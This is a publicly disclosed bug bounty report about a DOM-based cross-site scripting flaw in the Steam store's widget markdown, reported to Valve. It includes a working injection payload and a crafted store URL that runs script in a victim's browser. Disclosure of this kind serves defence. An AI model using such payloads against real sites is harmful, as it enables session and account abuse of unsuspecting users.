@@ -1,0 +1,37 @@
+ReportLink:https://hackerone.com/reports/313250
+WeaknessName:Cross-site Scripting (XSS) - DOM
+Reporter:https://hackerone.com/kenziy
+ReportedTo:Valve(valve)
+BountyAmount:1000.0
+Severity:medium
+State:Closed
+DateOfDisclosure:09.05.2018 17:40:20
+
+Summary:
+
+Hello guys
+I found an xss vulnerability on store.steampowered.com markdown
+
+#POC
+http://store.steampowered.com/widget/386360/?t=[url=google.com:/onclick=%27alert(document.domain)%27[url=]]xss[/url]
+
+#Here is my exploit
+```
+[url=google.com:/onclick='alert(document.domain)'[url=]]xss[/url]
+```
+#Steps
+1 - go to any product
+2 - click embed
+3 - The markdown for widgets area is vulnerable
+{F261131}
+4: http://store.steampowered.com/widget/386360/?t=[url=google.com:/onclick=%27alert(document.domain)%27[url=]]xss[/url]
+{F261134}
+
+My research was only limited on the widgets area I'm not totally sure if other markdown that is using [url=site.com] are vulnerable also. I will continue my research for this coz I believe it has some other area that are still affected by this issue.
+
+Cheers
+Kenziy
+
+## Impact
+
+XSS attack was possible by sending the vulnerable link to the target
